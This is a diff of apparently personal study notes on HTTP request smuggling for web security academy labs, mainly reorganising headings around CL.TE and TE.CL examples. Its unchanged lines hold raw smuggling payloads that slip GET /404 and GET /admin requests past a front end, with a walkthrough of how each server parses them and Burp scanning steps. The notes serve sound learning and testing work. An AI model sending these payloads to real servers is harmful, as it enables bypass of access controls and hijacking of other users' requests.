@@ -379,8 +379,7 @@ Observed any response status or response length difference.
 ### :white_check_mark: HTTP request smuggling
 _Burp suite extensions : Param miner | HTTP Request Smuggler_
 
-#### Summary
-##### CL.TE
+#### Manual - CL.TE
 ```
 POST / HTTP/1.1
 Host: 0ae60020040cd411805762cb00b400b4.web-security-academy.net
@@ -396,16 +395,16 @@ GET /404 HTTP/1.1
 X-Ignore: X
 ```
 
-###### Front-end
+##### Front-end
 The front end relies on `Content-Length: 43`, which is the length of the whole request.
 
-###### Back-end
+##### Back-end
 The back-end relies on `Transfer-Encoding: chunked`.
 1. The back-end reads 0x03 (3) bytes, which is `a=1`
 2. The back-end reads 0x00 (0) bytes, which means this is the end of the request
 3. The back-end now interprets the end of the request as a new request to /404
 
-###### Other example
+##### Other example
 ```
 POST / HTTP/1.1
 Host: 0a4d00d2030017ef81108fdd008e001a.web-security-academy.net
@@ -418,7 +417,7 @@ GET /404 HTTP/1.1
 X-Ignore: X
 ```
 
-##### TE.CL
+#### Manual - TE.CL
 ```
 POST / HTTP/1.1
 Host: 0aba00db04538e6c837c561b00b40058.web-security-academy.net
@@ -436,17 +435,17 @@ a=b
 
 ```
 
-###### Front-end
+##### Front-end
 The front end relies on `Transfer-Encoding: chunked` :
 1. The front-end reads 0x3f (63) bytes
 2. The front-end reads 0x00 (0) bytes, which means this is the end of the request
 
-###### Back-end
+##### Back-end
 The back-end relies on `Content-Length: 4`.
 1. The back-end 4 bytes, which is `3f\r\n`, then it is the end of the request
 2. The back-end reads its buffers and assumes a new request arrived by receiving GET /admin
 
-###### Other example
+##### Other example
 ```
 POST / HTTP/1.1
 Host: 0a86001a033d23d58098581000580080.web-security-academy.net
@@ -463,12 +462,12 @@ a=a
 
 ```
 
-#### Step 1 - Scan
+#### Automated -Step 1 - Scan
 - Use the **Param Miner** (all options)
 - Use the **HTTP Request Smuggler** (all options)
 - Use the built-in scanner : right-click the **Host** header value and scan the selected insertion point.
 
-#### Step 2 - Exploit
+#### Automated - Step 2 - Exploit
 
 ### :white_check_mark: OAuth authentication
 ### :white_check_mark: JWT attacks    
